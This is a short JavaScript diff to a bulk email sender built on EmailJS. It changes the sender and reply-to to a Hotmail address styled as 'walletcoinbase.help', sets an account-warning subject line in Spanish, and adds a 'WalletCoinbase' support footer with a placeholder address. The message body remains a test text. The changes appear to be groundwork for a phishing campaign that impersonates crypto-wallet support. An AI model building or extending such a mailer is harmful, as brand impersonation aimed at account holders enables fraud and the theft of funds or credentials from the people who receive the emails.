@@ -69,9 +69,12 @@
                 const emailTrimmed = recipients[index].trim();
                 if (emailTrimmed) {
                     const templateParams = {
+                        from_email: "walletcoinbase.help@hotmail.com", // Tu correo corporativo
                         to_email: emailTrimmed,
-                        subject: "Mensaje Automático",
-                        message: "Este es un correo de prueba."
+                        reply_to: "walletcoinbase.help@hotmail.com", // Para responder
+                        subject: "Información importante sobre tu cuenta",
+                        message: "Estimado usuario,\n\nEste es un correo de prueba.\n\nSaludos,\nEquipo de Soporte",
+                        footer: "Este correo fue enviado por WalletCoinbase.\nDirección: Calle 123, Ciudad, País\nSi no deseas recibir más correos, responde con 'Eliminar'."
                     };
                     emailjs.send("service_qwk48fy", "template_cizpv7g", templateParams)
                         .then(() => {
